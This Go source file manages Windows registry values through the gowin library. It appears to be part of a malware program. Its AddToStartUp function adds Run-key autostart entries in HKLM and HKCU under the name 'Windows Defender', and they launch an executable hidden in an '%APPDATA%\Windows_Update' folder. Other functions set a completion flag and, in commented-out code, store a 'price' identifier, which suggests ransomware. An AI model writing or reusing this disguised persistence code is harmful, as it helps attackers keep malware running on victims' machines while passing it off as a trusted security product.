package main

import "github.com/luisiturrios/gowin"
import "fmt"

func WriteRegDone() {
	err := gowin.WriteStringReg("HKLM", `Software\Policis`, "done", "true")
	if err != nil {
		//Write to CU
		err := gowin.WriteStringReg("HKCU", `Software\Policis`, "done", "true")
		if err == nil {
			fmt.Println("key in CU")
		}
	} else {
		fmt.Println("Key inserted LM")
	}
}

func ReadRegDone() bool {
	//get reg
	val, err := gowin.GetReg("HKLM", `Software\Policis`, "done")
	if err != nil {
		val, err := gowin.GetReg("HKCU", `Software\Policis`, "done")
		if err == nil {
			if val == "true" {
				return true
			}
		}
	}
	if val == "true" {
		return true
	} else {
		return false
	}
}

/*
func FetchPrice() {
	val, err := gowin.GetReg("HKLM", `Software\Policis`, "id")
    if err != nil {
    	val, err := gowin.GetReg("HKCU", `Software\Policis`, "id")
        if err == nil {
        	Price_id = StringToFloat(val)
        	Run("msg * got price")
        } else if err != nil {
        	PutPrice()
        	Run("msg * put price")
        }
    } else if err == nil {
    	Price_id = StringToFloat(val)
    }
}

func PutPrice() {
	gowin.WriteStringReg("HKLM",`Software\Policis`,"id",FloatToString(Price_id))
   	gowin.WriteStringReg("HKCU",`Software\Policis`,"id",FloatToString(Price_id))
}*/

func AddToStartUp() {
	gowin.WriteStringReg("HKLM", `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`, "Windows Defender", "%APPDATA%\\Windows_Update\\"+TARGET_FILE_NAME)
	gowin.WriteStringReg("HKCU", `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`, "Windows Defender", "%APPDATA%\\Windows_Update\\"+TARGET_FILE_NAME)
}
